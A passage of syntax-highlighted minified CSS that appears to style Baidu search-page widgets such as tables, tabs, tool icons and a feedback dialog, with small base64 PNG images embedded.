class="attribute">text-align</span>:left&#125;\n<span class="variable">.cr-content</span> <span class="variable">.c-table</span> td:first-child,<span class="variable">.cr-content</span> <span class="variable">.c-table</span> th:first-child&#123;padding-left:0&#125;\n<span class="variable">.c-table</span> th&#123;padding-top:4px;<span class="attribute">padding-bottom</span>:4px;<span class="attribute">font-weight</span>:400;<span class="attribute">color</span>:#666;<span class="attribute">border-color</span>:#f0f0f0;<span class="attribute">white-space</span>:nowrap;<span class="attribute">background-color</span>:#fafafa&#125;\n<span class="variable">.c-table</span> td&#123;padding-top:6.5px;<span class="attribute">padding-bottom</span>:6.5px&#125;\n<span class="variable">.c-table-hasimg</span> td&#123;padding-top:10px;<span class="attribute">padding-bottom</span>:10px&#125;\n<span class="variable">.c-table</span> a,<span class="variable">.c-table</span> em&#123;text-decoration:none&#125;\n<span class="variable">.c-table</span> a:hover,<span class="variable">.c-table</span> a:hover em&#123;text-decoration:underline&#125;\n<span class="variable">.c-table</span> a<span class="variable">.c-icon</span>:hover&#123;text-decoration:none&#125;\n<span class="variable">.c-table</span> <span class="variable">.c-btn</span>:hover,<span class="variable">.c-table</span> <span class="variable">.c-btn</span>:hover em&#123;text-decoration:none&#125;\n<span class="variable">.c-table-nohihead</span> th&#123;background-color:transparent&#125;\n<span class="variable">.c-table-noborder</span> td&#123;border-bottom:0&#125;\n<span class="variable">.c-tabs-nav-movetop</span>&#123;margin:-10px -9px 0 -10px;<span class="attribute">position</span>:relative&#125;\n<span class="variable">.c-tabs-nav</span>&#123;border-bottom:1px solid #d9d9d9;<span class="attribute">background-color</span>:#fafafa;<span class="attribute">line-height</span>:1.54;<span class="attribute">font-size</span>:0;*<span class="attribute">zoom</span>:1;<span class="attribute">_overflow-x</span>:hidden;<span class="attribute">_position</span>:relative&#125;\n<span class="variable">.c-tabs-nav</span>:after&#123;display:block;<span class="attribute">height</span>:0;<span class="attribute">content</span>:\"\";<span class="attribute">clear</span>:both;<span class="attribute">visibility</span>:hidden&#125;\n<span class="variable">.c-tabs-nav</span> <span class="variable">.c-tabs-nav-btn</span>&#123;float:right;<span class="attribute">_position</span>:absolute;<span class="attribute">_top</span>:0;<span class="attribute">_right</span>:0;<span class="attribute">_z-index</span>:1;<span class="attribute">background</span>:#fafafa&#125;\n<span class="variable">.c-tabs-nav</span> <span class="variable">.c-tabs-nav-btn</span> <span class="variable">.c-tabs-nav-btn-next</span>,<span class="variable">.c-tabs-nav</span> <span class="variable">.c-tabs-nav-btn</span> <span class="variable">.c-tabs-nav-btn-prev</span>&#123;float:left;<span class="attribute">padding</span>:6px 2px;<span class="attribute">cursor</span>:pointer&#125;\n<span class="variable">.c-tabs-nav</span> <span class="variable">.c-tabs-nav-btn</span> <span class="variable">.c-tabs-nav-btn-disable</span>&#123;cursor:default&#125;\n<span class="variable">.c-tabs-nav</span> <span class="variable">.c-tabs-nav-view</span>&#123;_position:relative;<span class="attribute">overflow</span>:hidden;*<span class="attribute">zoom</span>:1;<span class="attribute">margin-bottom</span>:-1px&#125;\n<span class="variable">.c-tabs-nav</span> <span class="variable">.c-tabs-nav-view</span> <span class="variable">.c-tabs-nav-li</span>&#123;margin-bottom:0&#125;\n<span class="variable">.c-tabs-nav</span> <span class="variable">.c-tabs-nav-more</span>&#123;float:left;<span class="attribute">white-space</span>:nowrap&#125;\n<span class="variable">.c-tabs-nav</span> a,<span class="variable">.c-tabs-nav</span> li&#123;color:#666;<span class="attribute">font-size</span>:13px;*<span class="attribute">zoom</span>:1&#125;\n<span class="variable">.c-tabs-nav</span> li&#123;display:inline-block;<span class="attribute">margin-bottom</span>:-1px;*<span class="attribute">display</span>:inline;<span class="attribute">padding</span>:3px 15px;<span class="attribute">vertical-align</span>:bottom;<span class="attribute">border-style</span>:solid;<span class="attribute">border-width</span>:2px 1px 0;<span class="attribute">border-color</span>:transparent;<span class="attribute">_border-color</span>:tomato;<span class="attribute">_filter</span>:chroma(color=tomato);<span class="attribute">list-style</span>:none;<span class="attribute">cursor</span>:pointer;<span class="attribute">white-space</span>:nowrap;<span class="attribute">overflow</span>:hidden&#125;\n<span class="variable">.c-tabs-nav</span> a&#123;text-decoration:none&#125;\n<span class="variable">.c-tabs-nav</span> <span class="variable">.c-tabs-nav-sep</span>&#123;height:16px;<span class="attribute">width</span>:0;<span class="attribute">padding</span>:0;<span class="attribute">margin-bottom</span>:4px;<span class="attribute">border-style</span>:solid;<span class="attribute">border-width</span>:0 1px;<span class="attribute">border-color</span>:transparent #fff transparent #dedede&#125;\n<span class="variable">.c-tabs-nav</span> <span class="variable">.c-tabs-nav-selected</span>&#123;_position:relative;<span class="attribute">border-color</span>:#2c99ff #e4e4e4 #fff #dedede;<span class="attribute">background-color</span>:#fff;<span class="attribute">color</span>:#000;<span class="attribute">cursor</span>:default&#125;\n<span class="variable">.c-tabs-nav-one</span> <span class="variable">.c-tabs-nav-selected</span>&#123;border-color:transparent;<span class="attribute">_border-color</span>:tomato;<span class="attribute">_filter</span>:chroma(color=tomato);<span class="attribute">background-color</span>:transparent;<span class="attribute">color</span>:#666&#125;\n<span class="variable">.c-tabs</span> <span class="variable">.c-tabs</span> <span class="variable">.c-tabs-nav</span>&#123;padding:10px 0 5px;<span class="attribute">border</span>:0;<span class="attribute">background-color</span>:#fff&#125;\n<span class="variable">.c-tabs</span> <span class="variable">.c-tabs</span> <span class="variable">.c-tabs-nav</span> a,<span class="variable">.c-tabs</span> <span class="variable">.c-tabs</span> <span class="variable">.c-tabs-nav</span> li&#123;color:#00c&#125;\n<span class="variable">.c-tabs</span> <span class="variable">.c-tabs</span> <span class="variable">.c-tabs-nav</span> li&#123;padding:0 5px;<span class="attribute">position</span>:static;<span class="attribute">margin</span>:0 10px;<span class="attribute">border</span>:0;<span class="attribute">cursor</span>:pointer;<span class="attribute">white-space</span>:nowrap&#125;\n<span class="variable">.c-tabs</span> <span class="variable">.c-tabs</span> <span class="variable">.c-tabs-nav</span> <span class="variable">.c-tabs-nav-sep</span>&#123;height:11px;<span class="attribute">width</span>:0;<span class="attribute">padding</span>:0;<span class="attribute">margin</span>:0 0 4px;<span class="attribute">border</span>:0;<span class="attribute">border-left</span>:1px solid #d8d8d8&#125;\n<span class="variable">.c-tabs</span> <span class="variable">.c-tabs</span> <span class="variable">.c-tabs-nav</span> <span class="variable">.c-tabs-nav-selected</span>&#123;background-color:#2c99ff;<span class="attribute">color</span>:#fff;<span class="attribute">cursor</span>:default&#125;\n<span class="variable">.c-tag</span>&#123;padding-top:3px;<span class="attribute">margin-bottom</span>:3px;<span class="attribute">height</span>:1.7em;<span class="attribute">font-size</span>:13px;<span class="attribute">line-height</span>:1.4em;<span class="attribute">transition</span>:height .3s ease-in;<span class="attribute">-webkit-transition</span>:height .3s ease-in;<span class="attribute">-moz-transition</span>:height .3s ease-in;<span class="attribute">-ms-transition</span>:height .3s ease-in;<span class="attribute">-o-transition</span>:height .3s ease-in;*<span class="attribute">zoom</span>:1;<span class="attribute">overflow</span>:hidden&#125;\n<span class="variable">.c-tag</span>:after&#123;display:block;<span class="attribute">height</span>:0;<span class="attribute">content</span>:\"\";<span class="attribute">clear</span>:both;<span class="attribute">visibility</span>:hidden&#125;\n<span class="variable">.c-tag-cont</span>&#123;overflow:hidden;*<span class="attribute">zoom</span>:1&#125;\n<span class="variable">.c-tag-cont</span> span,<span class="variable">.c-tag-li</span>,<span class="variable">.c-tag-more</span>,<span class="variable">.c-tag-type</span>&#123;margin:2px 0&#125;\n<span class="variable">.c-tag-cont</span> span,<span class="variable">.c-tag-li</span>,<span class="variable">.c-tag-type</span>&#123;float:left&#125;\n<span class="variable">.c-tag-more</span>,<span class="variable">.c-tag-type</span>&#123;color:#666&#125;\n<span class="variable">.c-tag-cont</span> span,<span class="variable">.c-tag-li</span>&#123;padding:0 4px;<span class="attribute">display</span>:inline-block;<span class="attribute">margin-right</span>:12px;<span class="attribute">white-space</span>:nowrap;<span class="attribute">cursor</span>:pointer;<span class="attribute">color</span>:#00c&#125;\n<span class="variable">.c-tag</span> <span class="variable">.c-tag-selected</span>&#123;background:#388bff;<span class="attribute">color</span>:#fff&#125;\n<span class="variable">.c-tag-more</span>&#123;float:right;<span class="attribute">background</span>:#fff;<span class="attribute">cursor</span>:pointer;*<span class="attribute">height</span>:18px&#125;\n<span class="variable">.c-tool</span>&#123;display:inline-block;<span class="attribute">width</span>:56px;<span class="attribute">height</span>:56px;<span class="attribute">background</span>:url(\/\/www<span class="variable">.baidu</span><span class="variable">.com</span>\/aladdin\/img\/tools\/tools-5<span class="variable">.png</span>) no-repeat&#125;\n<span class="variable">.c-tool-region</span>&#123;background-position:0 0&#125;\n<span class="variable">.c-tool-calendar</span>&#123;background-position:-72px 0&#125;\n<span class="variable">.c-tool-city</span>&#123;background-position:-144px 0&#125;\n<span class="variable">.c-tool-phone-pos</span>&#123;background-position:-216px 0&#125;\n<span class="variable">.c-tool-other</span>&#123;background-position:-288px 0&#125;\n<span class="variable">.c-tool-midnight</span>&#123;background-position:-360px 0&#125;\n<span class="variable">.c-tool-kefu</span>&#123;width:121px;<span class="attribute">background-position</span>:-432px 0&#125;\n<span class="variable">.c-tool-phone</span>&#123;background-position:-576px 0&#125;\n<span class="variable">.c-tool-car</span>&#123;background-position:-648px 0&#125;\n<span class="variable">.c-tool-station</span>&#123;background-position:0 -72px&#125;\n<span class="variable">.c-tool-cheat</span>&#123;background-position:-72px -72px&#125;\n<span class="variable">.c-tool-counter</span>&#123;background-position:-144px -72px&#125;\n<span class="variable">.c-tool-time</span>&#123;background-position:-216px -72px&#125;\n<span class="variable">.c-tool-zip</span>&#123;background-position:-288px -72px&#125;\n<span class="variable">.c-tool-warning</span>&#123;background-position:-360px -72px&#125;\n<span class="variable">.c-tool-ip</span>&#123;background-position:0 -144px&#125;\n<span class="variable">.c-tool-unit</span>&#123;background-position:-72px -144px&#125;\n<span class="variable">.c-tool-rate</span>&#123;background-position:-144px -144px&#125;\n<span class="variable">.c-tool-conversion</span>&#123;background-position:-288px -144px&#125;\n<span class="variable">.c-tool-ads</span>&#123;background-position:-360px -144px&#125;\n<span class="variable">.soutu-input</span>&#123;padding-left:55px!important&#125;\n<span class="variable">.soutu-input-image</span>&#123;position:absolute;<span class="attribute">left</span>:1px;<span class="attribute">top</span>:1px;<span class="attribute">height</span>:28px;<span class="attribute">width</span>:49px;<span class="attribute">z-index</span>:1;<span class="attribute">padding</span>:0;<span class="attribute">background</span>:#e6e6e6;<span class="attribute">border</span>:1px solid #e6e6e6&#125;\n<span class="variable">.soutu-input-thumb</span>&#123;height:28px;<span class="attribute">width</span>:28px;<span class="attribute">min-width</span>:1px&#125;\n<span class="variable">.soutu-input-close</span>&#123;position:absolute;<span class="attribute">right</span>:0;<span class="attribute">top</span>:0;<span class="attribute">cursor</span>:pointer;<span class="attribute">display</span>:block;<span class="attribute">width</span>:22px;<span class="attribute">height</span>:28px&#125;\n<span class="variable">.soutu-input-close</span>::after&#123;content:\" \";<span class="attribute">position</span>:absolute;<span class="attribute">right</span>:3px;<span class="attribute">top</span>:50%;<span class="attribute">cursor</span>:pointer;<span class="attribute">margin-top</span>:-7px;<span class="attribute">display</span>:block;<span class="attribute">width</span>:14px;<span class="attribute">height</span>:14px;<span class="attribute">background</span>:url(https:\/\/ss1<span class="variable">.bdstatic</span><span class="variable">.com</span>\/5eN1bjq8AAUYm2zgoY3K\/r\/www\/cache\/static\/protocol\/https\/soutu\/img\/soutu_icons_new_8abaf8a<span class="variable">.png</span>?v=62527263<span class="variable">.png</span>) no-repeat -163px 0&#125;\n<span class="variable">.soutu-input-image</span>:hover <span class="variable">.soutu-input-close</span>::after&#123;background-position:-215px 2px&#125;\n<span class="variable">.fb-hint</span>&#123;margin-top:5px;<span class="attribute">transition-duration</span>:.9s;<span class="attribute">opacity</span>:0;<span class="attribute">display</span>:none;<span class="attribute">color</span>:red&#125;\n<span class="variable">.fb-img</span>&#123;display:none&#125;\n<span class="variable">.fb-hint-tip</span>&#123;height:44px;<span class="attribute">line-height</span>:24px;<span class="attribute">background-color</span>:#38f;<span class="attribute">color</span>:#fff;<span class="attribute">box-sizing</span>:border-box;<span class="attribute">width</span>:269px;<span class="attribute">font-size</span>:16px;<span class="attribute">padding</span>:10px;<span class="attribute">padding-left</span>:14px;<span class="attribute">position</span>:absolute;<span class="attribute">top</span>:-65px;<span class="attribute">right</span>:-15px;<span class="attribute">border-radius</span>:3px;<span class="attribute">z-index</span>:299&#125;\n<span class="variable">.fb-hint-tip</span>::before&#123;content:\"\";<span class="attribute">width</span>:0;<span class="attribute">height</span>:0;<span class="attribute">display</span>:block;<span class="attribute">position</span>:absolute;<span class="attribute">border-left</span>:8px solid transparent;<span class="attribute">border-right</span>:8px solid transparent;<span class="attribute">border-top</span>:8px solid #38f;<span class="attribute">bottom</span>:-8px;<span class="attribute">right</span>:25px&#125;\n<span class="variable">.fb-mask</span>,<span class="variable">.fb-mask-light</span>&#123;position:fixed;<span class="attribute">top</span>:0;<span class="attribute">left</span>:0;<span class="attribute">bottom</span>:0;<span class="attribute">right</span>:0;<span class="attribute">z-index</span>:296;<span class="attribute">background-color</span>:#000;<span class="attribute">filter</span>:alpha(opacity=60);<span class="attribute">background-color</span>:rgba(0,0,0,.6)&#125;\n<span class="variable">.fb-mask-light</span>&#123;background-color:#fff;<span class="attribute">filter</span>:alpha(opacity=0);<span class="attribute">background-color</span>:rgba(255,255,255,0)&#125;\n<span class="variable">.fb-success</span> <span class="variable">.fb-success-text</span>&#123;text-align:center;<span class="attribute">color</span>:#333;<span class="attribute">font-size</span>:13px;<span class="attribute">margin-bottom</span>:14px&#125;\n<span class="variable">.fb-success-text</span><span class="variable">.fb-success-text-title</span>&#123;color:#3b6;<span class="attribute">font-size</span>:16px;<span class="attribute">margin-bottom</span>:16px&#125;\n<span class="variable">.fb-success-text-title</span> i&#123;width:16px;<span class="attribute">height</span>:16px;<span class="attribute">margin-right</span>:5px&#125;\n<span class="variable">.fb-list-container</span>&#123;box-sizing:border-box;<span class="attribute">padding</span>:4px 8px;<span class="attribute">position</span>:absolute;<span class="attribute">top</span>:0;<span class="attribute">left</span>:0;<span class="attribute">bottom</span>:0;<span class="attribute">right</span>:0;<span class="attribute">z-index</span>:298;<span class="attribute">display</span>:block;<span class="attribute">width</span>:100%;<span class="attribute">cursor</span>:pointer;<span class="attribute">margin-top</span>:-5px;<span class="attribute">margin-left</span>:-5px&#125;\n<span class="variable">.fb-list-container-hover</span>&#123;background-color:#fff;<span class="attribute">border</span>:2px #38f solid&#125;\n<span class="variable">.fb-list-container-first</span>&#123;box-sizing:border-box;<span class="attribute">padding-left</span>:10px;<span class="attribute">padding-top</span>:5px;<span class="attribute">position</span>:absolute;<span class="attribute">top</span>:0;<span class="attribute">left</span>:0;<span class="attribute">bottom</span>:0;<span class="attribute">right</span>:0;<span class="attribute">z-index</span>:297;<span class="attribute">display</span>:block;<span class="attribute">width</span>:100%;<span class="attribute">cursor</span>:pointer;<span class="attribute">margin-top</span>:-5px;<span class="attribute">margin-left</span>:-5px;<span class="attribute">border</span>:3px #f5f5f5 dashed;<span class="attribute">border-radius</span>:3px&#125;\n<span class="variable">.fb-des-content</span>&#123;font-size:13px!important;<span class="attribute">color</span>:#000&#125;\n<span class="variable">.fb-des-content</span>::-webkit-input-placeholder&#123;font-size:13px!important;<span class="attribute">color</span>:#9a9a9a&#125;\n<span class="variable">.fb-des-content</span>:-moz-placeholder&#123;font-size:13px!important;<span class="attribute">color</span>:#9a9a9a&#125;\n<span class="variable">.fb-des-content</span>::-moz-placeholder&#123;font-size:13px!important;<span class="attribute">color</span>:#9a9a9a&#125;\n<span class="variable">.fb-des-content</span>:-ms-input-placeholder&#123;font-size:13px!important;<span class="attribute">color</span>:#9a9a9a&#125;\n<span class="variable">.fb-btn</span>,<span class="variable">.fb-btn</span>:visited&#123;color:#333!important&#125;\n<span class="variable">.fb-select</span>&#123;position:relative;<span class="attribute">background-color</span>:#fff;<span class="attribute">border</span>:1px solid #ccc&#125;\n<span class="variable">.fb-select</span> i&#123;position:absolute;<span class="attribute">right</span>:2px;<span class="attribute">top</span>:7px&#125;\n<span class="variable">.fb-type</span>&#123;width:350px;<span class="attribute">box-sizing</span>:border-box;<span class="attribute">height</span>:28px;<span class="attribute">font-size</span>:13px;<span class="attribute">line-height</span>:28px;<span class="attribute">border</span>:0;<span class="attribute">word-break</span>:normal;<span class="attribute">word-wrap</span>:normal;<span class="attribute">position</span>:relative;<span class="attribute">appearance</span>:none;<span class="attribute">-moz-appearance</span>:none;<span class="attribute">-webkit-appearance</span>:none;<span class="attribute">display</span>:inline-block;<span class="attribute">vertical-align</span>:middle;<span class="attribute">line-height</span>:normal;<span class="attribute">color</span>:#333;<span class="attribute">background-color</span>:transparent;<span class="attribute">border-radius</span>:0;<span class="attribute">overflow</span>:hidden;<span class="attribute">outline</span>:0;<span class="attribute">padding-left</span>:5px&#125;\n<span class="variable">.fb-type</span>::-ms-expand&#123;display:none&#125;\n<span class="variable">.fb-btn</span>&#123;display:inline-block;<span class="attribute">padding</span>:0 14px;<span class="attribute">margin</span>:0;<span class="attribute">height</span>:24px;<span class="attribute">line-height</span>:25px;<span class="attribute">font-size</span>:13px;<span class="attribute">filter</span>:chroma(color=#000000);*<span class="attribute">zoom</span>:1;<span class="attribute">border</span>:1px solid #d8d8d8;<span class="attribute">cursor</span>:pointer;<span class="attribute">font-family</span>:inherit;<span class="attribute">font-weight</span>:400;<span class="attribute">text-align</span>:center;<span class="attribute">vertical-align</span>:middle;<span class="attribute">background-color</span>:#f9f9f9;<span class="attribute">overflow</span>:hidden;<span class="attribute">outline</span>:0&#125;\n<span class="variable">.fb-btn</span>:hover&#123;border-color:#388bff&#125;\n<span class="variable">.fb-btn</span>:active&#123;border-color:#a2a6ab;<span class="attribute">background-color</span>:#f0f0f0;<span class="attribute">box-shadow</span>:inset 1px 1px 1px #c7c7c7;<span class="attribute">-webkit-box-shadow</span>:inset 1px 1px 1px #c7c7c7;<span class="attribute">-moz-box-shadow</span>:inset 1px 1px 1px #c7c7c7;<span class="attribute">-o-box-shadow</span>:inset 1px 1px 1px #c7c7c7&#125;\na<span class="variable">.fb-btn</span>&#123;text-decoration:none&#125;\nbutton<span class="variable">.fb-btn</span>&#123;height:26px;<span class="attribute">_line-height</span>:18px;*<span class="attribute">overflow</span>:visible&#125;\nbutton<span class="variable">.fb-btn</span>::-moz-focus-inner&#123;padding:0;<span class="attribute">border</span>:0&#125;\n<span class="variable">.fb-btn</span> <span class="variable">.c-icon</span>&#123;margin-top:5px&#125;\n<span class="variable">.fb-btn-primary</span>,<span class="variable">.fb-btn-primary</span>:visited&#123;color:#fff!important&#125;\n<span class="variable">.fb-btn-primary</span>&#123;background-color:#388bff;<span class="attribute">_width</span>:82px;<span class="attribute">border-color</span>:#3c8dff #408ffe #3680e6&#125;\n<span class="variable">.fb-btn-primary</span>:hover&#123;border-color:#2678ec #2575e7 #1c6fe2 #2677e7;<span class="attribute">background-color</span>:#388bff;<span class="attribute">background-image</span>:url(data:image\/png;<span class="attribute">base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAACCAMAAACuX0YVAAAABlBMVEVnpv85i\/9PO5r4AAAAD0lEQVR42gEEAPv\/AAAAAQAFAAIros7PAAAAAElFTkSuQmCC);background-repeat</span>:repeat-x;<span class="attribute">box-shadow</span>:1px 1px 1px rgba(0,0,0,.4);<span class="attribute">-webkit-box-shadow</span>:1px 1px 1px rgba(0,0,0,.4);<span class="attribute">-moz-box-shadow</span>:1px 1px 1px rgba(0,0,0,.4);<span class="attribute">-o-box-shadow</span>:1px 1px 1px rgba(0,0,0,.4)&#125;\n<span class="variable">.fb-btn-primary</span>:active&#123;border-color:#178ee3 #1784d0 #177bbf #1780ca;<span class="attribute">background-color</span>:#388bff;<span class="attribute">background-image</span>:none;<span class="attribute">box-shadow</span>:inset 1px 1px 1px rgba(0,0,0,.15);<span class="attribute">-webkit-box-shadow</span>:inset 1px 1px 1px rgba(0,0,0,.15);<span class="attribute">-moz-box-shadow</span>:inset 1px 1px 1px rgba(0,0,0,.15);<span class="attribute">-o-box-shadow</span>:inset 1px 1px 1px rgba(0,0,0,.15)&#125;\n<span class="variable">.fb-feedback-right-dialog</span>&#123;position:fixed;<span class="attribute">z-index</span>:299;<span class="attribute">bottom</span>:0;<span class="attribute">right</span>:0&#125;\n<span class="variable">.fb-feedback-list-dialog</span>,<span class="variable">.fb-feedback-list-dialog-left</span>&#123;position:absolute;<span class="attribute">z-index</span>:299&#125;\n<span class="variable">.fb-feedback-list-dialog</span>:before&#123;content:\"\";<span class="attribute">width</span>:0;<span class="attribute">height</span>:0;<span class="attribute">display</span>:block;<span class="attribute">position</span>:absolute;<span class="attribute">top</span>:15px;<span class="attribute">left</span>:-6px;<span class="attribute">border-top</span>:8px solid transparent;<span class="attribute">border-bottom</span>:8px solid transparent;<span class="attribute">border-right</span>:8px solid #fff&#125;\n<span class="variable">.fb-feedback-list-dialog-left</span>:before&#123;content:\"\";<span class="attribute">width</span>:0;<span class="attribute">height</span>:0;<span class="attribute">display</span>:block;<span class="attribute">position</span>:absolute;<span class="attribute">top</span>:15px;<span class="attribute">right</span>:-6px;<span class="attribute">border-top</span>:8px solid transparent;<span class="attribute">border-bottom</span>:8px solid transparent;<span class="attribute">border-left</span>:8px solid #fff&#125;\n<span class="variable">.fb-header</span>&#123;padding-left:20px;<span class="attribute">padding-right</span>:20px;<span class="attribute">margin-top</span>:14px;<span class="attribute">text-align</span>:left;<span class="attribute">-moz-user-select</span>:none&#125;\n<span class="variable">.fb-header</span> <span class="variable">.fb-close</span>&#123;color:#e0e0e0&#125;\n<span class="variable">.fb-close</span>&#123;text-decoration:none;<span class="attribute">margin-top</span>:2px;<span class="attribute">float</span>:right;<span class="attribute">font-size</span>:20px;<span class="attribute">font-weight</span>:700;<span class="attribute">line-height</span>:18px;<span class="attribute">color</span>:#666;<span class="attribute">text-shadow</span>:0 1px 0 #fff&#125;\n<span class="variable">.fb-photo-block</span>&#123;display:none&#125;\n<span class="variable">.fb-photo-block-title</span>&#123;font-size:13px;<span class="attribute">color</span>:#333;<span class="attribute">padding-top</span>:10px&#125;\n<span class="variable">.fb-photo-block-title-span</span>&#123;color:#999&#125;\n<span class="variable">.fb-photo-sub-block</span>&#123;margin-top:10px;<span class="attribute">margin-bottom</span>:10px;<span class="attribute">width</span>:60px;<span class="attribute">text-align</span>:center&#125;\n<span class="variable">.fb-photo-sub-block-hide</span>&#123;display:none&#125;\n<span class="variable">.fb-photo-update-block</span>&#123;overflow:hidden&#125;\n<span class="variable">.fb-photo-update-item-block</span>&#123;width:100px;<span class="attribute">height</span>:100px;<span class="attribute">background</span>:red;<span class="attribute">border</span>:solid 1px #ccc;<span class="attribute">margin-top</span>:10px;<span class="attribute">float</span>:left;<span class="attribute">margin-right</span>:20px;<span class="attribute">position</span>:relative;<span class="attribute">background</span>:url(https:\/\/ss1<span class="variable">.bdstatic</span><span class="variable">.com</span>\/5eN1bjq8AAUYm2zgoY3K\/r\/www\/cache\/static\/protocol\/https\/global\/img\/feedback_add_photo_69ff822<span class="variable">.png</span>?v=62527263<span class="variable">.png</span>);<span class="attribute">background-repeat</span>:no-repeat;<span class="attribute">background-size</span>:contain;<span class="attribute">background-position</span>:center center;<span class="attribute">background-size</span>:24px 24px&#125;\n<span class="variable">.fb-photo-block-title-ex</span>&#123;font-size:13px;<span class="attribute">float</span>:right&#125;\n<span class="variable">.fb-photo-block-title-ex</span> img&#123;vertical-align:text-top;<span class="attribute">margin-right</span>:4px&#125;\n<span class="variable">.fb-photo-block-title-span</span>&#123;margin-left:4px;<span class="attribute">color</span>:#999&#125;\n<span class="variable">.fb-photo-update-item-show-img</span>&#123;width:100%;<span class="attribute">height</span>:100%;<span class="attribute">display</span>:none&#125;\n<span class="variable">.fb-photo-update-item-close</span>&#123;width:13px;<span class="attribute">height</span>:13px;<span class="attribute">position</span>:absolute;<span class="attribute">top</span>:-6px;<span class="attribute">right</span>:-6px;<span class="attribute">display</span>:none&#125;\n<span class="variable">.fb-photo-block</span> input&#123;display:none&#125;\n<span class="variable">.fb-photo-update-hide</span>&#123;display:none&#125;\n<span class="variable">.fb-photo-update-item-block</span>&#123;width:60px;<span class="attribute">height</span>:60px;<span class="attribute">border</span>:solid 1px #ccc;<span class="attribute">float</span>:left&#125;\n<span class="variable">.fb-photo-block-example</span>&#123;position:absolute;<span class="attribute">top</span>:0;<span class="attribute">left</span>:0;<span class="attribute">display</span>:none;<span class="attribute">background-color</span>:#fff;<span class="attribute">padding</span>:14px;<span class="attribute">padding-top</span>:0;<span class="attribute">width</span>:392px&#125;\n<span class="variable">.fb-photo-block-example-header</span>&#123;padding-top:14px;<span class="attribute">overflow</span>:hidden&#125;\n<span class="variable">.fb-photo-block-example-header</span> p&#123;float:left&#125;\n<span class="variable">.fb-photo-block-example-header</span> img&#123;float:right;<span class="attribute">width</span>:13px;<span class="attribute">height</span>:13px&#125;\n<span class="variable">.fb-photo-block-example-img</span> img&#123;margin:0 auto;<span class="attribute">margin-top</span>:14px;<span class="attribute">display</span>:block;<span class="attribute">width</span>:200px&#125;\n<span class="variable">.fb-photo-block-example-title</span>&#123;text-align:center&#125;\n<span class="variable">.fb-photo-block-example-title-big</span>&#123;font-size:14px;<span class="attribute">color</span>:#333&#125;\n<span class="variable">.fb-photo-block-example-title-small</span>&#123;font-size:13px;<span class="attribute">color</span>:#666&#125;\n<span class="variable">.fb-header</span> a<span class="variable">.fb-close</span>:hover&#123;text-decoration:none&#125;\n<span class="variable">.fb-photo-block-upinfo</span>&#123;width:100%&#125;\n<span class="variable">.fb-header-tips</span>&#123;font-size:16px;<span class="attribute">margin</span>:0;<span class="attribute">color</span>:#333;<span class="attribute">text-rendering</span>:optimizelegibility&#125;\n<span class="variable">.fb-body</span>&#123;margin-bottom:0;<span class="attribute">padding</span>:20px;<span class="attribute">padding-top</span>:10px;<span class="attribute">overflow</span>:hidden;<span class="attribute">text-align</span>:left&#125;\n<span class="variable">.fb-modal</span>,<span class="variable">.fb-success</span>&#123;background-color:#fff;<span class="attribute">cursor</span>:default;<span class="attribute">top</span>:100%;<span class="attribute">left</span>:100%;<span class="attribute">width</span>:390px;<span class="attribute">overflow</span>:hidden;<span class="attribute">border</span>:1px solid #999;*<span class="attribute">border</span>:1px solid #ddd;<span class="attribute">font-size</span>:13px;<span class="attribute">line-height</span>:1.54&#125;\n<span class="variable">.fb-textarea</span> textarea&#123;width:350px;<span class="attribute">height</span>:64px;<span class="attribute">padding</span>:4px;<span class="attribute">margin</span>:10px 0;<span class="attribute">vertical-align</span>:top;<span class="attribute">resize</span>:none;<span class="attribute">overflow</span>:auto;<span class="attribute">box-sizing</span>:border-box;<span class="attribute">display</span>:inline-block;<span class="attribute">border</span>:1px solid #ccc;<span class="attribute">-webkit-border-radius</span>:0;<span class="attribute">-moz-border-radius</span>:0;<span class="attribute">border-radius</span>:0;<span class="attribute">-webkit-box-shadow</span>:inset 0 1px 1px rgba(0,0,0,.075);<span class="attribute">-moz-box-shadow</span>:inset 0 1px 1px rgba(0,0,0,.075);<span class="attribute">box-shadow</span>:inset 0 1px 1px rgba(0,0,0,.075);<span class="attribute">-webkit-transition</span>:border linear .2s,box-shadow linear .2s;<span class="attribute">-moz-transition</span>:border linear .2s,box-shadow linear .2s;<span class="attribute">-ms-transition</span>:border linear .2s,box-shadow linear .2s;<span class="attribute">-o-transition</span>:border linear .2s,box-shadow linear .2s;<span class="attribute">transition</span>:border linear .2s,box-shadow linear .2s&#125;\n<span class="variable">.fb-selected</span>&#123;display:none;<span class="attribute">width</span>:12px;<span class="attribute">height</span>:12px;<span class="attribute">background</span>:url(data:image\/png;<span class="attribute">base64,iVBORw0KGgoAAAANSUhEUgAAAAcAAAAFCAYAAACJmvbYAAAABGdBTUEAALGPC\/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAABmJLR0QAAAAAAAD5Q7t\/AAAACXBIWXMAABYlAAAWJQFJUiTwAAAAJklEQVQI12NgwAEsuv\/8xy9h3vX7P6oEKp\/BHCqA0yhzdB0MDAwAFXkTK5la4mAAAAAASUVORK5CYII=) no-repeat 2px 3px&#125;\n.fb-guide&#123;padding-top</span>:10px;<span class="attribute">color</span>:#9a9a9a;<span class="attribute">margin-left</span>:-20px;<span class="attribute">padding-left</span>:20px;<span class="attribute">border-right-width</span>:0;<span class="attribute">margin-right</span>:-20px;<span class="attribute">padding-right</span>:25px;<span class="attribute">margin-bottom</span>:-20px;<span class="attribute">padding-bottom</span>:15px&#125;\n<span class="variable">.fb-footer</span>&#123;padding-top:10px;<span class="attribute">text-align</span>:left&#125;\n<span class="variable">.fb-block</span>&#123;overflow:hidden;<span class="attribute">position</span>:relative&#125;\n<span class="variable">.fb-block</span> <span class="variable">.fb-email</span>&#123;height:28px;<span class="attribute">line-height</span>:26px;<span class="attribute">width</span>:350px;<span class="attribute">border</span>:1px solid #ccc;<span class="attribute">padding</span>:4px;<span class="attribute">padding-top</span>:0;<span class="attribute">box-sizing</span>:border-box;<span class="attribute">padding-bottom</span>:0;<span class="attribute">display</span>:inline-block;<span class="attribute">font-family</span>:'Helvetica Neue',Helvetica,Arial,sans-serif;<span class="attribute">vertical-align</span>:middle!important;<span class="attribute">-webkit-border-radius</span>:0;<span class="attribute">-moz-border-radius</span>:0;<span class="attribute">border-radius</span>:0;<span class="attribute">-webkit-box-shadow</span>:inset 0 1px 1px rgba(0,0,0,.075);<span class="attribute">-moz-box-shadow</span>:inset 0 1px 1px rgba(0,0,0,.075);<span class="attribute">box-shadow</span>:inset 0 1px 1px 